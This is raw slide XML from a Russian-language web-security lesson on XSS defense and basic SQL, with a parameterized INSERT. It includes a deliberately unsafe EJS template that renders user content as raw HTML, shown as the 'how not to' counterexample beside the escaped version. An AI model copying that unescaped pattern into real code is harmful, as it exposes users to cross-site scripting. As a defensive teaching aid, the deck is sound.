                      <a:r>
                        <a:rPr sz="1575" b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script</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1575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</a:rPr>
                        <a:t>&gt;</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1575" b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const</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1575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q = </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1575" b="0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</a:rPr>
                        <a:t>"VALUE"</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1575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;</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1575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</a:rPr>
                        <a:t>&lt;/</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1575" b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script</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1575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</a:rPr>
                        <a:t>&gt;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Передача данных отдельно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от исполняемого кода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Рисунок 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4CAB9A22-6CE1-40CC-8DB5-595F13D0E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7823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9800B42E-3227-4509-A8D7-BEB242138A33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Meme Forum: защита от XSS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539885D-29E1-4A0C-AD97-7B3CDD7DB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3" name="v17-text-45">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7FC48582-BE3E-404E-9B48-A2D1BA436E15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5067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8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Как не надо</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="v17-text-46">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B398AE0B-5772-42F9-AFFB-7A9984911B51}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="1914525"/>
            <a:ext cx="5067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8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Как надо</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="v17-text-47">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{15AB410E-5590-4D94-9F36-72BE52FE7825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50673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&lt;!-- rich.ejs: raw HTML --&gt;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6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div</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="165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65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"saved-content"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="165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6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&lt;%-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content </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="16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%&gt;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16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div</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="165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6" name="v17-text-48">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E3BA4A50-44B6-4CDB-ADDF-5203E1247A20}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="2476500"/>
            <a:ext cx="50673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&lt;!-- rich.ejs: HTML escaping --&gt;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6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div</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="165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65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"saved-content"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="165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6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&lt;%=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content </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="16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%&gt;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&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="16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div</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1650" b="0">
                <a:solidFill>
                  <a:srgbClr val="80808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endParaRPr sz="1650" b="0">
              <a:solidFill>
                <a:srgbClr val="80808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/* Переносы строк: CSS */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.saved-content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{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white-space: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 pre-wrap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v17-text-49">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{317885B8-3716-4D04-A508-895E5C12093D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="5324475"/>
            <a:ext cx="102870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203200" indent="-101600" algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:buChar char="•"/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2F6"/>
                </a:solidFill>
                <a:latin typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Для текста: экранирование или textContent. Для HTML: sanitizer с allowlist.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="203200" indent="-101600" algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:buChar char="•"/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2F6"/>
                </a:solidFill>
                <a:latin typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>CSP и HttpOnly дополняют защиту. HttpOnly не мешает XSS действовать от имени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4360190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">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8D9F0BF1-8068-4EA3-93BC-7D4EE4A1FC8A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SQL: сохранение данных приложения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89D8A233-6A15-4396-A717-4325B95A94B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Пользователь отправляет форму. Backend проверяет значения и сохраняет новую строку в базе данных.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="process-node-browser">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DD4C7C62-9749-4919-B08A-78F7DF8BB2A9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2857500" cy="257175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8D9B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browser-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6A576588-2CBD-45A0-845E-8EC360402057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Браузер</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="browser-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{12653E72-5551-4856-B0DA-AB3AD9851DB4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="3990975"/>
            <a:ext cx="2552700" cy="1171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Форма участника</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr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username: alex</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="process-node-app">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{666DA7A2-5CB5-45CC-BC56-040978FD5F5D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4667250" y="2686050"/>
            <a:ext cx="2857500" cy="257175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8D9B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app-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5CFE8570-F3F0-4880-A72A-FD41849CC9F3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4781550" y="350520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Backend</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="app-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D9752217-B369-43B5-A2F3-F3DF49215B21}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4819650" y="3990975"/>
            <a:ext cx="2552700" cy="1171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Проверяет значение</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr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Выполняет INSERT</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr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 параметрами</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="process-node-db">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F58746DA-D978-4F2F-A946-323CB2E54B81}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8648700" y="2686050"/>
            <a:ext cx="2857500" cy="257175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8D9B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db-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{68729FBE-FACD-4351-BED3-A13E520D65A1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8763000" y="350520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СУБД</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="db-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5F991D1A-F094-48CC-815C-F20ABBC19993}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8801100" y="3990975"/>
            <a:ext cx="2552700" cy="1171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Добавляет строку</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr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 users</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr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Возвращает результат</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="12" name="flow-form">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CD8940EB-A81E-46AC-8666-F1D7134D72CB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3543300" y="3486150"/>
            <a:ext cx="1123950" cy="0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3" name="flow-label-form">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AD97F90A-0304-43F0-9CC4-9AB9BB8BD7CB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3600450" y="2905125"/>
            <a:ext cx="1009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Данные</a:t>
            </a:r>
          </a:p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формы</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="14" name="flow-insert">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BE21B9F9-19FA-4CDB-9DBC-704F8486C410}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7524750" y="3486150"/>
            <a:ext cx="1123950" cy="0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5" name="flow-label-insert">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7F6B7914-C21A-4B55-BAEB-CC2C33B37B1F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7581900" y="3067050"/>
            <a:ext cx="1009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INSERT</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="16" name="flow-saved">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F7389A71-D09D-42D5-8401-CA53773643C3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7524750" y="4552950"/>
            <a:ext cx="1123950" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="23813">
            <a:solidFill>
              <a:srgbClr val="8D9BA5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:headEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="flow-label-saved">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C2BC6E9D-1CD3-410A-BA08-EBB495DB2084}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7581900" y="4657725"/>
            <a:ext cx="1009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Строка</a:t>
            </a:r>
          </a:p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сохранена</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="18" name="flow-success">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8C0A0B64-F781-4493-86FD-2F524FC488EA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3543300" y="4552950"/>
            <a:ext cx="1123950" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="23813">
            <a:solidFill>
              <a:srgbClr val="8D9BA5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:headEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="flow-label-success">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EE52C300-C1AB-4F34-9F6B-51025D11EE3D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3600450" y="4657725"/>
            <a:ext cx="1009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Успех</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="insert-sql">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3D277DF3-879F-434C-A5E3-52D7409FE21F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8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8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users</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="18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(id, username) </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="187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VALUES</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="18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(:id, :username);</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="component-laptop-23">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F38D8F23-0D11-4579-A8A3-7C43522D03A3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1928812" y="2876550"/>
            <a:ext cx="371475" cy="278606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component-laptop-24">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{60554608-60AF-4C8B-B1EF-95E101FCFE9D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1866900" y="3155156"/>
            <a:ext cx="495300" cy="108347"/>
          </a:xfrm>
          <a:prstGeom prst="trapezoid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component-server-25">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{374AA910-E7E0-403C-A9D3-6B88A4199B65}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5848350" y="2876550"/>
            <a:ext cx="495300" cy="141514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component-server-26">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E7EB15CC-B68A-496A-8F10-A6861B9F984D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6255203" y="2920774"/>
            <a:ext cx="35378" cy="35378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component-server-27">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{48C47EBB-174E-4E35-9D84-D89EBA4928B1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5848350" y="3053442"/>
            <a:ext cx="495300" cy="141514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component-server-28">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{010AE264-8A77-4442-8085-993090309F69}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6255203" y="3097666"/>
            <a:ext cx="35378" cy="35378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component-server-29">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1FA25DBE-085B-44B1-A38A-5E2B3762CB1A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5848350" y="3230335"/>
            <a:ext cx="495300" cy="141514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component-server-30">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BA936154-4099-403E-B3FF-A05C438C10A0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6255203" y="3274560"/>
            <a:ext cx="35378" cy="35378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component-database-31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{678792F2-E2C7-4E44-8BE9-1E6FDFEAA3F5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9829800" y="2947306"/>
            <a:ext cx="495300" cy="336096"/>
          </a:xfrm>
          <a:prstGeom prst="rect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component-database-32">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FC9F4C20-65BC-46C1-83BE-D51E139DE2D1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9829800" y="2876550"/>
            <a:ext cx="495300" cy="141514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component-database-33">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{86EA66D9-FB95-46B3-8C8E-E1414285CF09}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9829800" y="3053442"/>
            <a:ext cx="495300" cy="141514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component-database-34">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D43EA863-9A38-41E0-9B5A-06E59F840927}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9829800" y="3230335"/>
            <a:ext cx="495300" cy="141514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2" name="Рисунок 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DD222BF9-5452-48EB-B931-A8EF7A45F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2545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6C85DF4E-1BEE-4DAF-9910-A508EE17B6F4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SQL: чтение и изменение строк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589EDE3-3EC0-40EF-9292-6481347BC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13" name="v7-text-193">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{49ECCFA4-DE6F-47B4-89CF-463284D75C9A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dirty="0" err="1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Исходно</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0" dirty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 users: (17, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0" dirty="0" err="1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alex</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0" dirty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). </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0" dirty="0" err="1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Команды</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0" dirty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dirty="0" err="1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применяются</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0" dirty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dirty="0" err="1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последовательно</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0" dirty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D9114231-29DC-4E72-8FE0-F4BC3766BEAD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="685800" y="2324100"/>
          <a:ext cx="10820400" cy="3200400"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr first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800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Команда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800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Назначение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800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SQL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800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Результат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650" b="0" dirty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SELECT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65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Прочитать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650" b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SELECT</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650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username </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b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FROM</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650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users</a:t>
                      </a:r>
                    </a:p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650" b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WHERE</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650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id = </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b="0">
                          <a:solidFill>
                            <a:srgbClr val="B5CEA8"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>17</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650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;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65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alex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650" b="0" dirty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INSERT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650" b="0" dirty="0" err="1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Добавить</a:t>
                      </a:r>
                      <a:endParaRPr sz="1650" b="0" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="EEF2F6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650" b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INSERT</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650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650" b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INTO</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650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users </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b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VALUES</a:t>
                      </a:r>
                    </a:p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650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(</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b="0">
                          <a:solidFill>
                            <a:srgbClr val="B5CEA8"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>23</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650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, </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b="0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</a:rPr>
                        <a:t>'maria'</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650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);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65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Новая строка</a:t>
                      </a:r>
                    </a:p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65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 / maria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650" b="0" dirty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UPDATE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650" b="0" dirty="0" err="1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Изменить</a:t>
                      </a:r>
                      <a:endParaRPr sz="1650" b="0" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="EEF2F6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650" b="0" dirty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UPDATE</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b="0" dirty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users </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b="0" dirty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SET</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b="0" dirty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username =</a:t>
                      </a:r>
                    </a:p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650" b="0" dirty="0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</a:rPr>
                        <a:t>'</a:t>
                      </a:r>
                      <a:r>
